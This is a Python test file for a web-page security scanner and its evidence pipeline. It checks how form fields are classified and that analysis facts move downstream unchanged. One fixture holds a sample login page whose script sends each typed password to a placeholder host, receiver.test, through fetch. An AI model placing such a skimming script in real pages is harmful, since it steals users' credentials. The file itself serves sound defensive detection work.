"""Cross-layer contracts: analysis is produced by L3, never invented downstream."""
from copy import deepcopy
from pathlib import Path
import ast

import pytest
from L3_SCANNER import L3Scanner
from L3_SCANNER.analyzers.html import native_submission
from L3_SCANNER.output import output_documents
from L3_SCANNER.policies.operational import operational_detection_policy
from evidence_pipeline import build_record
from evidence_pipeline.context_relations import build_internal_context as build_context
from evidence_pipeline.context_relations import present, restore
from evidence_pipeline.judgment_contract import evidence_ids
from evidence_pipeline.records import digest


@pytest.mark.parametrize('attributes,expected',[
    ({'type':'password','name':None,'disabled':False},'excluded_missing_name'),
    ({'type':'password','name':'','disabled':False},'excluded_missing_name'),
    ({'type':'password','disabled':False},'unknown_name_not_recorded'),
    ({'type':'password','name':'pass','disabled':True},'excluded_disabled'),
    ({'type':'password','name':'pass'},'unknown_disabled_state_not_recorded'),
    ({'type':'password','name':'pass','disabled':False,'readonly':True},'candidate_under_recorded_attributes_only'),
    ({'type':'hidden','name':'nonce','disabled':False},'candidate_under_recorded_attributes_only'),
    ({'type':'checkbox','name':'join','disabled':False},'conditional_checked_state_required'),
    ({'type':'radio','name':'join','disabled':False,'checked':False},'excluded_unchecked'),
    ({'type':'submit','name':'send','disabled':False},'conditional_activated_submitter_required'),
    ({'type':'image','name':None,'disabled':False},'coordinates_only_if_activated_submitter'),
    ({'type':'reset','name':'reset','disabled':False},'excluded_non_submit_control'),
    ({'tag':'textarea','type':'reset','name':'text','disabled':False},'candidate_under_recorded_attributes_only'),
])
def test_l3_native_rules_distinguish_exclusion_unknown_and_conditions(attributes,expected):
    assert native_submission.native_participation(attributes)==expected


def scan():
    return L3Scanner(operational_detection_policy()).scan_content({
        'original_url':'https://club.test/members', 'html':{'content':
        '<title>Club members</title><form method="get"><input id="pw" type="password"><button>Login</button></form>'
        '<script>var p=document.getElementById("pw");p.addEventListener("input",function(){'
        'fetch("https://receiver.test/log",{method:"POST",body:p.value});});</script>'}})


def test_real_l3_record_context_transfer_preserves_native_and_separate_js_evidence(monkeypatch):
    result=scan();raw=result['raw'];facts=result['analysis_facts']
    assert facts[0]['fields'][0]['status']=='excluded_missing_name'
    assert facts[0]['source']['sha256']==digest(raw['html'])
    assert output_documents(result)[1]['analysis_facts']==facts
    def forbidden(*args,**kwargs):
        raise AssertionError('downstream called an analyzer')
    monkeypatch.setattr(native_submission,'analyze_native_submission',forbidden)
    monkeypatch.setattr(native_submission,'native_participation',forbidden)
    record=build_record('l3',result,request_id='test',attempt=1)
    context=build_context([record],{'l3':raw})
    transferred=context['analysis_facts'][0]
    assert {k:v for k,v in transferred.items() if k not in ('layer','raw_reference','record_reference')}==facts[0]
    assert transferred['raw_reference']['sha256']==digest(raw)
    assert 'L3-native-submission' in evidence_ids(context)
    field=context['recorded_relationships']['form_paths'][0]['recorded_fields'][0]
    assert field['native_analysis_recorded']==[{'analysis_id':'L3-native-submission','source_pointer':'/html/inputs/0'}]
    assert transferred['fields'][0]['status']=='excluded_missing_name'
    assert 'explanation' not in field['native_analysis_recorded'][0]
    networks=[b for b in context['behaviors'] if b['kind']=='network_requests']
    assert any(b['linked_sources'] for b in networks)
    assert all(b['execution_observed'] is False for b in networks)


def test_absent_l3_analysis_is_not_recreated_by_record_or_builder(monkeypatch):
    result=scan();result.pop('analysis_facts')
    def forbidden(*args,**kwargs):raise AssertionError('analysis must remain absent')
    monkeypatch.setattr(native_submission,'native_participation',forbidden)
    record=build_record('l3',result,request_id='test',attempt=1)
    context=build_context([record],{'l3':result['raw']})
    assert record['analysis_facts']==context['analysis_facts']==[]
    assert context['recorded_relationships']['form_paths'][0]['recorded_fields'][0]['native_analysis_recorded']==[]


def test_analyzer_source_binding_rejects_changed_raw_instead_of_recomputing():
    result=scan();changed=deepcopy(result['raw'])
    changed['html']['inputs'][0]['name']='new-password-name'
    with pytest.raises(ValueError,match='analysis_fact_source_hash_mismatch'):
        build_record('l3',result,request_id='test',attempt=1,raw=changed)


def test_builder_does_not_import_scanners_analyzers_or_judge():
    root=Path(__file__).resolve().parents[1]/'evidence_pipeline'
    for name in ['context_source.py','context_relations.py','context_inventory.py','judgment_context.py','records.py']:
        tree=ast.parse((root/name).read_text(encoding='utf-8'))
        imports=[]
        for node in ast.walk(tree):
            if isinstance(node,ast.Import):imports.extend(x.name for x in node.names)
            elif isinstance(node,ast.ImportFrom):imports.append(node.module or '')
        assert not any('SCANNER' in x or 'analyzer' in x or 'gateway' in x for x in imports),(name,imports)


def test_context_presentation_has_no_native_rule_or_url_decision_output():
    source={'documents':[], 'analysis_facts':[], 'layers':[], 'observations':[]}
    context=present(source)
    assert restore(context)==source
    assert 'scope_question' not in context['request_observation_focus']
    assert 'question' not in context['judgment_subject']
    assert 'verdict' not in context and 'risk_score' not in context
